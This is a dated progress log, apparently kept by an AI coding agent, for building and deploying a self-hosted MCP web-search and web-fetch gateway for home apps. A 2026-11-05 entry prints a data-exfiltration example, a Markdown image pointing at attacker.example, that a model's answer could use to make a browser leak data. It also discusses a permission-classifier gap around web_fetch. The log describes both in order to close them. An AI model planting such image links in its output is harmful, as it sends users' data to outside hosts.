# Progress

A dated log of what was done and decided, newest first. The plan and milestone status live in [plan.md](plan.md).

---

## 2026-11-10

- **On the user's "go all e2e for them for me":** the alerts, and one real 8-seat homestorm meeting.
- **The meeting:** 8 seats (Claude Haiku 5.5, Sonnet 5.5 and Sonnet 5, GPT-5.6 Luna and Terra, GPT-6 Luna, DeepSeek Flash and
  V4 Pro), all with web tools. 2 rounds, each sent to everyone at once: the current k3s release, then the latest MCP spec and
  recent news. Titled "mcpgw test: 8 seats, 2 rounds (safe to delete)".
  - **Calls:** 43 searches and 27 fetches, none failed. 12 fetches came from the cache, and none were `thin`.
  - **Answers:** 7 of 8 seats named k3s v1.37.2+k3s1, which is the stable channel. GPT-6 Luna named v1.34.13+k3s1, an older
    line released the same day. All 8 named MCP spec 2026-07-28.
  - **Waits:** 22 searches in 27 s in round 1. With searches 1 s apart, the median search took 4.6 s and the longest 13 s, nearly
    all of it waiting for a turn. There were no CAPTCHAs and no refusals, so the gap stays at 1 s.
  - **Engine errors:** DuckDuckGo's parsing error on `site:` searches 12 times, as before. Wikipedia answered HTTP errors and
    was left out for a while (9 times); it adds little to these searches.
  - **Empty:** 4 searches, all with a path after `site:` (`site:github.com/k3s-io/k3s/releases …`). Run again on a local SearXNG,
    Yahoo found nothing for the path form and Bing returned news front pages. Asked `site:github.com k3s-io k3s releases …`,
    Yahoo returned the releases pages.
- **Fix:** the SearXNG provider now sends a bare domain after `site:`, with the path as words. web_search's filter still holds
  results to the path, and the cache key keeps the model's own query. The query that was empty now returns the k3s releases
  pages.
- **Alerts, ntfy.sh:** chosen on the same go, since it needs nothing from the user but the app. arch-infra is a public repo and an
  ntfy topic works as its password, so the topic is random and goes in a Secret, `observability/grafana-ntfy`, never in git.
  Auto mode doesn't allow Secret writes, so the user creates it. A message posted to the topic with ntfy's `grafana` template
  arrived as a title and a message. The arch-infra change routes only `app=mcpgw` alerts to it. It waits for the Secret,
  since Grafana's new pod can't start without it.

## 2026-11-09

- **Plan, on the user's "go all 1-6 e2e and push":** six items, from the user's own meetings on 2026-11-08 and 09 (Node.js
  releases, weather, NAS drive prices, Backblaze). All 31 of their searches worked, in 0.6 to 4.3 s. 13 of 17 fetches read. The
  other 4 were sites refusing mcpgw: Newegg 3 times and raidsize.com once.
- **1. DuckDuckGo through duckduckgo.com.** html.duckduckgo.com still answered CAPTCHA. A probe of every keyless engine in the
  pinned SearXNG image found nine that answered, among them `duckduckgo web`, which reads duckduckgo.com instead. Four mixes,
  scored with `retrieval.mjs`, all reached 97% on the topic. The chosen one was the only one in which no engine refused: the old
  DuckDuckGo engine answered CAPTCHA after 19 searches, and GMX after 2 ([ADR 0012](adr/0012-search-engine-mix.md)).
- **2. A push deploys only when the image changes.** CI still lints and tests every push. It compares with the commit
  arch-infra deploys, not with the previous push: on 2026-11-07, comparing with the previous push would have left a code commit
  whose CI failed unbuilt, since the next commit only fixed a YAML file.
- **3. Dropdowns keep what they show.** A real question about Node.js read the download page, and got "Get Node.js® for using
  with": the version was in a `<button role="combobox">`, which Readability removes. Each dropdown now becomes the text it
  shows. Pages under 1,000 characters are logged as `thin`. The 36 benchmark pages are otherwise unchanged: 27 of 36 usable,
  the one change from 28 a GitHub page that answered HTTP 504.
- **4. Searches 1 s apart.** Three bursts of 6 searches at once at 1 s, the size of a meeting round, drew no refusals. A round
  takes about 6 s instead of 11.
- **5. Alerts reach someone:** not done. There's no channel to send them to, and email was left out by the user's earlier
  decision in arch-infra, so the user picks ntfy, Discord or email.
- **6. Upkeep comes as an issue** on the 7th of each month, from `dev/upkeep/report.mjs`. Its first run found Biome 2.6.6, now
  taken, and nothing in SearXNG's 9 newer commits that touches an engine mcpgw uses. A run by hand on GitHub wrote the report
  and skipped the issue, as it should.
- **Deployed by pushing,** as `14964f7`: CI read the deployed commit from arch-infra, built the image, and GitHub Actions bumped
  the tag (arch-infra `408fc44`). On the cluster:
  - **Search:** 97% on the topic, 30 of 31 first results, 15 of 15 `site:`, no empty or failed searches, and a median of 0.6 s.
    The only engine errors were 2 DuckDuckGo parsing errors on `site:` searches, which Yahoo answered, and one from Wikipedia.
  - **Pages:** 28 of 36 usable.
  - **Node.js's download page** reads "Get Node.js® v26.13.0 LTS", and its log line has `thin: true`.
  - **The status page** says searches run at least 1 second apart.
- **The docs-only push that recorded this** ran the checks and skipped the build: no bump, and the pod kept running. Then
  `12bfcbb` made only `build.yml` count among the workflows, so it deployed once more, and the upkeep report now shows in its
  run's log too.

## 2026-11-08

- **CI bumps arch-infra itself now.** `ARCH_INFRA_TOKEN` is set on this repo, the same fine-grained token homecal,
  homenews, homeparentcontrol, homework, llm-gateway and homestorm use. Until now the job skipped with a warning and
  tags were bumped by hand. This commit is the check: it rebuilds the same code, and the bump should come from GitHub
  Actions.

## 2026-11-07

- **Next steps chosen by the user:** ship what's ready, official APIs for sites that refuse mcpgw, tune from real use, and monthly
  upkeep. Nothing else is planned yet. From here, homestorm is changed only where mcpgw needs data from it.
- **Engines that refuse are left out.** DuckDuckGo went from CAPTCHAs to timing out, which added 5 s to every other search. An
  engine that refuses, or fails 3 searches in a row, is now left out for 5 minutes, doubling up to an hour. Locally, searches went
  from 5.0, 0.6 and 5.0 s to about 0.6 s each.
- **Stack Overflow and npm now read through their official APIs** ([ADR 0013](adr/0013-read-refusing-sites-through-official-apis.md)).
  Locally, usable pages went from 26 to 28 of 36. Search was 90% on the topic against 98% the day before, because DuckDuckGo was
  out throughout, which matches the 90% measured with it blocked in ADR 0012.
- **Upkeep's first pass** ([upkeep.md](upkeep.md)): the MCP spec and SDK are current, and hono went to 4.13.17. SearXNG stays
  pinned, since the newer image only changes engines we don't use.
- **Deployed on the user's OK,** as `20a3db6`, with the two alert rules in Grafana. CI had failed on the last 3 commits, because
  Biome also formats YAML and rejected the alert rules file. I hadn't checked the run's result, so the first tag pointed at an image
  that didn't exist. The new pod couldn't pull it and the old one kept serving, until `20a3db6` fixed the file.
- **On the cluster:**
  - **News:** 85% good results, up from 67% before these changes and 80% locally.
  - **Pages:** 28 of 36 usable.
  - **Search:** 90% on the topic with DuckDuckGo out throughout, and a median of 0.5 s.
  - **Brave News:** it refused once during the test and was left out, as designed.
- **A tuning meeting** (3 seats, 2 rounds):
  - **Developer questions:** every seat read Stack Overflow and npm through the APIs, and every checkable answer was right, such as zod
    4.6.7.
  - **Everyday questions:** weather came from the National Weather Service, and the AI news was current.
  - **Speed:** answers took 23 to 38 s. Searches waited up to about 10 s for their turn, more while DuckDuckGo's timeouts lasted.
- **From the day's 91 homestorm tool calls:**
  - **`it` searches:** every one fell back to general search.
  - **Search times:** a median of 2.6 s and a 90th percentile of 8.9 s.
  - **Wikipedia:** its HTTP 400s on `site:` queries had it left out for 5 minutes. Only timeouts count now (`4d0c581`, deployed on
    the user's go).
  - **Tried and dropped:** a 3 s timeout for DuckDuckGo alone, since SearXNG waits as long as its slowest engine's timeout.

- **The first real meeting on the cluster** worked end to end: 3 seats, one from each model family, over 2 rounds, with a search, a PDF, a site that refuses
  mcpgw, and a cluster address refused. It also found three problems:
  - **One round sends a burst:** 6 searches in 3 s, and DuckDuckGo answered with CAPTCHAs. Searches are now spaced 2 s apart.
  - **News came back mostly off-topic.** Given a time range, SearXNG skips every engine without time-range support, which left Bing
    News alone. News now sends no range, with Brave News instead of DuckDuckGo News: 67% to 80% on the new `news.mjs`.
  - **Every answer used all 4 web calls.** homestorm now allows 6, and its links stop at Chinese punctuation.
- **Deployed and retested** (mcpgw `6a0e823`, homestorm `d9b9072`):
  - **News:** all three seats gave real tech news, and two read an article, where before they gave headlines that were barely tech.
  - **Links:** a link written next to Chinese punctuation now stops where it should.
  - **Slower:** searches waited up to 11 s for their turn, and answers took 24 to 43 s instead of 10 to 18.
- **Still not right:**
  - **DuckDuckGo:** it has answered CAPTCHA on nearly every search since the first meeting, even at one search a minute. Yahoo and
    Bing carry general search.
  - **Brave News:** it refused with "too many requests" after the day's testing.
  - **Bing News:** it sometimes fails to parse.
  - **GPT-5.6 Luna:** it read PostgreSQL's draft 19.0 release notes as a release, both times. The page is the project's own.
- **Corrections:**
  - **DuckDuckGo suspension:** a CAPTCHA doesn't suspend it. SearXNG asks again on every search.
  - **The cause of weak news:** DuckDuckGo News never ran on searches with a time range.
- **A cleanup mistake:** a `pkill -f` pattern meant for a local dev server also matched seven production APIs, because k3s
  containers run as the same user on arch. They were stopped twice, about 12 s each time, and Kubernetes restarted them all.

## 2026-11-06

- **M9 deployed on the user's OK,** as image `f6e747a`. From homestorm's pod, a search, a PDF and a normal page worked, and a private
  address was refused. The tools-alone test on production scored 98% on the topic, 31 of 31 first results, 15 of 15 `site:`, 3 of 3 PDFs
  and 26 of 36 pages, level with the local run. DuckDuckGo drew 3 CAPTCHAs during it, and the score held. The answer scores weren't
  re-run on production.
- **M9 built, with steps 2 to 4 waiting on a deploy.** Measured against Claude Code's own search, on the same model and questions,
  graded blind: 99.2 with mcpgw, 93 with its own search, and 29.7 with no tools. GPT-5.6 Luna went from 78.1 to 90.6. Search results on
  the topic went from 83% to 96%, `site:` from 0 to 15 of 15, and PDFs from 0 to 3 of 3. The numbers are in [the plan](plan.md).
  - **The first conclusions below were too harsh.** That test was unpaced and drew CAPTCHAs. Paced, the old setup already scored 83%,
    and it matched Claude's search with the engines healthy. What it lacked was reliability, PDFs and clean text.
  - **Adding Yahoo alone barely helped** (86% to 88%). Moving Bing to the back did (94%): [ADR 0012](adr/0012-search-engine-mix.md).
  - **A 0.2 MB PDF could have taken the pod down,** peaking at 626 MB, because a worker's heap cap doesn't see buffers. The pool now
    limits the whole process's memory: [ADR 0011](adr/0011-read-pdfs-in-capped-workers.md).
  - **GPT often picked `category: "it"`** (13 of 50 searches), which is only GitHub and Stack Overflow, and got little back. Narrow
    categories now widen, which helped take its empty searches from 12 of 63 to 3 of 50.
  - **Auto mode blocked the deploy** of steps 2 to 4, so production has the engine mix only until the user confirms.
- **M9 planned: how good are the tools for a chatbot?** Usable today, but not dependable yet. `web_search` is the weak link.
  - **Measured on the live tools:** 61% of search results on the topic, 0 of 15 for Chinese and 0 of 10 for `site:`, and 8 of 29
    searches empty in a model test. 23 of 35 pages gave usable text. GPT-5.6 Luna got 9 of 15 questions right, 3 partly.
  - **Yahoo stood out:** alone on the same 25 queries, 98% on the topic against 57%. It isn't in the engine list yet.
  - **Comparing with Claude's search:** not done yet. The plan is to build a benchmark first, in M9 step 0.
  - **SearXNG stays for now** (D13). Stract and Whoogle are archived, YaCy and Marginalia have their own but smaller indexes, and
    hosted APIs aren't open source.
  - **Nothing was changed** in mcpgw or on the cluster for this. The user chose to update the plan now and do the work later.
- **M8: a status page at `/docs`,** for looking at mcpgw in a browser on arch: version, search health, engines that failed in the
  last hour, the tools and their inputs, how to connect, and log queries. Not Swagger, since the tools all sit behind one
  `POST /mcp`. Checked in a real browser against the real SearXNG, and the page's client example was run for real.
  Deployed on the user's OK.
- **Grafana:** mcpgw and homestorm added to the "Home apps — HTTP overview" dashboard.
- **`CLAUDE.md`:** stay inside this repo unless the user asks for a specific change outside it.

## 2026-11-05

- **Harnesses disconnected, the user's decision** ([ADR 0010](adr/0010-home-apps-only-for-now.md)). Only home apps call mcpgw
  for now. mcpgw is out of Claude Code's and Codex's configs. Its `/etc/hosts` line and pinned IP stay, so it can be reached
  from arch when wanted. Any program on arch or pod that calls it still gets an answer; this is a choice about configuration,
  not a lock.
- **M7: mcpgw and llmgw reachable only from arch and the cluster,** the user's decision
  ([ADR 0008](adr/0008-only-arch-and-the-cluster-no-auth.md)), replacing LAN access.
  - **Why:** neither has a login, nothing outside arch needs them, any device on the network could use them, and llmgw's open
    CORS let web pages call it.
  - **Done:** every app uses the full Service name, llmgw 0.7.0 refuses other Host names and other sites' pages, and both
    Ingresses are gone. On arch, `/etc/hosts` points both full names at their Service IPs, which are pinned in the charts.
  - **In a real browser on arch:** `http://llmgw.llmgw.svc.cluster.local/docs` renders, and its own requests work. A page from
    `homestorm.arch.internal` is refused by both gateways.
  - **Firewall rule written and tested in a throwaway network namespace:** a simulated LAN device reaches the Service and pod
    ranges without it and is blocked with it, while Traefik and arch itself keep working. It blocks Ollama from other devices too. The user installed it, and llmgw's Ollama calls still work.
  - **Not tested from a real second device,** though Traefik's 404 was checked with the Host header such a device would send.
  - **Out of scope, the user's call:** the homenews iOS app, whose code isn't in its repo.
- **M6: mcpgw added to Claude Code and Codex.** Both connect at user level.
  - **Which search do they pick?** The built-in one, 4 of 4, on Claude Code and on Codex. The original finish line isn't met
    by default.
  - **What changes that:** one instruction worked on both. Turning the built-in off worked on Claude Code; on Codex,
    `web_search="disabled"` fell back to another hosted search (`codex_apps search_service.web_run`), not mcpgw.
  - **Why not force it:** with `web_fetch` not approved, mcpgw's answers were weaker. Codex ran 16 searches and said 18.4,
    where its built-in said 18.6. Claude Code couldn't confirm a version. These were unattended runs, one each. D12 is
    the user's call; the recommendation is to keep the built-ins and name mcpgw when wanted.
  - **A real gap:** in Claude Code's `auto` mode, the classifier approved `web_fetch` by itself, with no prompt. "Not on the
    allow list" isn't enough there, so it needs an `ask` rule. Auto mode refused to let me add it to the user's settings,
    which is fair, so it's the user's step. Tested per-run: with the rule, it's denied unattended.
  - **Codex:** `approval_mode = "prompt"` asks in a real interactive session ("Allow the mcpgw MCP server to run tool
    "web_fetch"?"), and refuses unattended.
  - **Services table** added to arch-infra's README.
- **M5 done: homestorm uses mcpgw,** in its own repo (M9 there, and its ADR 0014). A real meeting in a real browser against
  the real llmgw and mcpgw, then deployed. On the cluster: the migration landed with all 3 meetings and 42 messages intact,
  and homestorm's real client searched through mcpgw from its pod, and had a fetch of llmgw refused by name.
  - **Checking with thinking on changed the design:**
    - **`tool_choice: "none"`:** DeepSeek wrote its raw `<｜｜DSML｜｜tool_calls>` markup into the answer, and Claude Opus
      returned no text. So the forced final answer gets the research as plain text and no tools, which worked everywhere;
    - **`tool_choice: "required"`:** llmgw refuses it for thinking Claude models, so "must search" names `web_search`.
  - **A leak found on the way:** homestorm rendered Markdown images in answers, so a model could make the chair's browser
    send `![](https://attacker.example/?data=…)` with no click. Images in answers no longer load.
  - **Not checked:** a real meeting on the cluster, which needs the admin login.
- **M5 started: streaming tools checked through llmgw,** on Claude Haiku 5.5, GPT-5.6 Luna and DeepSeek Flash, with
  mcpgw's real tool schemas. `tool_calls` assemble from their deltas, `$schema` is accepted, `tool_choice: "required"`
  and `"none"` both work, the latter with tool history, which Claude needs. DeepSeek fetched `https://www.postgresql.org/`
  from memory alongside its search, which is the kind of URL the source rule exists to refuse.
- **M4 done: `web_fetch` on the cluster.**
  - **A real bug found by trying the worst case.** On the main thread, 5 MB of tags took 9.5 s and 1.3 GB, which would
    freeze every caller and get the pod killed. Pages are now parsed in workers with a memory cap and a time limit, so a
    hostile page costs only its own request. Six hostile inputs are in the tests, including ones aimed at quadratic
    regexes, and none stalled the main thread by more than 500 ms.
  - **The network layer holds.** From inside the pod with a plain `fetch`, the node, the router, llmgw (by name, service
    and pod), homestorm, the Kubernetes API and cloud metadata are all refused, while SearXNG and the public web work. A
    pod with no policy reaches those same addresses, so it's the policy doing it.
  - **Real pages.** 19 of 22 read in about half a second. Stack Overflow and Medium answer 403 to mcpgw's plain
    `User-Agent`; they're reported as refused rather than worked around. Cloudflare's sites and modelcontextprotocol.io
    answered `Accept: text/markdown` with clean Markdown.
  - **Found on real pages:** Readability keeps a scrap of a home page (NPR's 1 MB page gave 213 characters), so a short
    "article" now falls back to the whole page. Markdown documents take their title from the document.
  - **Readability stays.** Defuddle was 3–5× slower and not clearly better: ahead on GitHub READMEs, behind on Wikipedia
    and MDN.
  - **D11:** PDFs are refused with a clear message for now.
- **M3 done: `web_search` on SearXNG.** 21 queries from the home IP: results for all of them, mean 0.7 s, slowest 1.8 s.
  - **Engines from this IP:** Bing answered 14 queries and DuckDuckGo 11, with 3 CAPTCHAs. Brave answered 5 before "too
    many requests" suspended it, even with 1.5 s between queries. Google refused every query ("access denied"), so it's
    off. Bing's own default was off, so it's turned on.
  - **Weak spots:** niche technical queries ("how to pin dns lookup undici agent" led with Pinterest), and a location
    query got the wrong town. A nonsense query still returned results.
  - **D10:** no paid fallback for now. Worth another look after real use, since most of this rests on one engine.
  - **No Secret after all:** SearXNG's key signs nothing that outlives the pod, so the pod generates one at boot. That
    also removes the one manual step auto mode couldn't do.
- **M2 done: the skeleton is live** at http://mcpgw.arch.internal, deployed through arch-infra.
  - **Real harnesses through Traefik:** Claude Code and Codex both called the tool at the real hostname, logged as
    `claude-code/2.1.318` and `codex-mcp-client/0.166.0` with no configuration.
  - **Long-lived requests:** Traefik 3 has a 60 s read timeout by default, which looked like it might cut Claude Code's
    `subscriptions/listen`. It doesn't: replayed from what Claude Code really sends, it held for 330 s until the test
    ended it. The SDK sends a keepalive every 15 s.
  - **Not tested:** a second device. That's the user's to try: `curl http://mcpgw.arch.internal/health`.
  - **Open:** `ARCH_INFRA_TOKEN` isn't set on this repo, so CI skips the arch-infra tag bump, and tags are bumped by hand
    as on homestorm. *Set on 2026-11-08.*
- **DNS:** `mcpgw.arch.internal` added by the user, and answered by the router.
- **M1 done: the repo is public.** The user made it public, since auto mode refuses to. Checked with no credentials:
  the repo page and the raw README both load. Next is M2.
- **Repo created, private at first:** `autumnfallenwang/mcpgw`, with README, plan, this log, ADRs 0001–0009, the updated
  design and the test scripts under `dev/`. It's plain Markdown docs only for now: no code, no devkit scaffold. Auto
  mode refused to create a public repo, so making it public is the user's step, and the last item in M1. It should
  happen before M2, because the cluster pulls images anonymously and GHCR images inherit the repo's visibility.
- **Three choices taken on the recommended side, not yet confirmed.** The user said to go ahead without picking
  between them, so the docs use the recommended option, and each is easy to change:
  - no REST mirror in v1 ([ADR 0005](adr/0005-mcp-only-no-rest-mirror.md));
  - `web_fetch` asks each time in harnesses
    ([ADR 0007](adr/0007-keeping-data-from-leaking-through-web-fetch.md));
  - no auth on the home network ([ADR 0008](adr/0008-only-arch-and-the-cluster-no-auth.md)). This one assumes only trusted
    devices share the network, which the user still needs to confirm.
- **Design corrected** after checking it against MCP `2026-07-28`, SDK v2, OWASP and vendor docs. The architecture
  held; the protocol details were a generation behind.
  - SDK: `@modelcontextprotocol/sdk` 1.x replaced by the v2 packages
    ([ADR 0003](adr/0003-mcp-sdk-v2-both-protocol-versions.md)).
  - Results: text plus `structuredContent` replaced by text plus `_meta`
    ([ADR 0004](adr/0004-text-results-app-data-in-meta.md)).
  - Added: Host and Origin settings, tool annotations, fetch rate limit, URL length limit, output cleaning,
    `ipaddr.js` instead of hand-written IP checks, NetworkPolicies
    ([ADR 0006](adr/0006-web-fetch-cannot-reach-home-network.md)), and the rule against data leaks
    ([ADR 0007](adr/0007-keeping-data-from-leaking-through-web-fetch.md)).
  - Fixed: the two sections that disagreed on whether "no results" is an error (it isn't), the Claude Desktop claim
    (custom connectors connect from Anthropic's cloud), `--scope user` on the Claude Code command, and the Service
    port (80, like llmgw).
  - Build order: the skeleton now deploys first ([plan.md](plan.md)).
- **SDK v2 tried with real harnesses** ([dev/harness-check/](../dev/harness-check/)). `server` 2.4.0, `hono` 2.0.2,
  `client` 2.4.0, Claude Code 2.1.318, Codex 0.166.0.
  - One endpoint served Claude Code at `2026-07-28` and Codex at `2025-06-18`; both called the tool.
  - `GET` and `DELETE` on `/mcp` answer 405 with no code of ours. Claude Code sends no `GET` on the new protocol; it
    sends a `subscriptions/listen` POST instead.
  - **Three setup traps found:**
    - a hostile `Origin` got a 200 until `allowedOrigins: []` was set;
    - a name not in `allowedHosts`, such as the in-cluster one, gets a 403;
    - `/health` on the MCP app refuses a pod-IP `Host`, so it goes on an outer app.
  - A named origin (`http://homestorm.arch.internal`) was also refused. Not investigated, since nothing in a browser
    should call mcpgw.
- **What a model actually receives,** read from Claude Code's delivered `tool_result`, using a test tool whose text
  block and `structuredContent` carried different prices.
  - Claude Code delivered only the JSON and dropped the text block. Codex's model saw both.
  - A text-only result reached both unchanged. `_meta` reached neither model, and Codex's client event showed it
    arriving.
- **Claude Code and Codex first tried against SDK 1.32.2,** plain HTTP to a non-loopback address, no auth. Both
  connected and quoted the made-up price.
  - `codex exec` refused the tool: "MCP tool call requires approval, but approval policy is never". Both
    `readOnlyHint: true` on the server and `tools.web_search.approval_mode="approve"` on the client fixed it.
    `readOnlyHint` means Codex then runs the tool without asking, which is why `web_fetch` gets a client setting
    ([ADR 0007](adr/0007-keeping-data-from-leaking-through-web-fetch.md)).
  - Claude Code held a `GET /mcp` stream open for the whole session on the old protocol.
- **Network facts checked:**
  - the router's DNS answers each `.arch.internal` name individually, with no wildcard. `mcpgw.arch.internal` doesn't
    resolve yet;
  - this machine (`aaron-desktop-arch`, 192.168.1.163) is the k3s node, and has no VPN;
  - k3s runs with no flag disabling network policies, and `argocd` already has some. Enforcement isn't proven yet.
- **Not tested yet:** Traefik, the real hostname, a second device, and Codex's `approval_mode = "prompt"`. All are on
  the plan (M2 and M6).
- **Research limits, for later:**
  - evidence on SearXNG reliability is forums and vendor posts, with no independent benchmark;
  - a July report says Anthropic closed a `web_fetch` leak by no longer following links inside fetched pages, while
    its current docs still list fetch results as an allowed URL source. The strict rule was chosen either way.

## 2026-11-04

- **Design written** ([design.md](design.md)): a tool gateway beside llmgw, with `web_search` through SearXNG and
  `web_fetch`, over MCP.
- **Tool loop tried with a fake MCP server** against the real llmgw
  ([dev/tool-loop-demo/](../dev/tool-loop-demo/)). Claude Haiku 5.5, GPT-5.6 Luna and DeepSeek Flash each chose to
  search for a price, wrote their own query and quoted the fake result. None searched for "Who wrote Hamlet?". Claude
  doubted the source, DeepSeek suggested cross-checking, and GPT stated it as fact, so sources must stay visible.
  Non-streaming calls only.
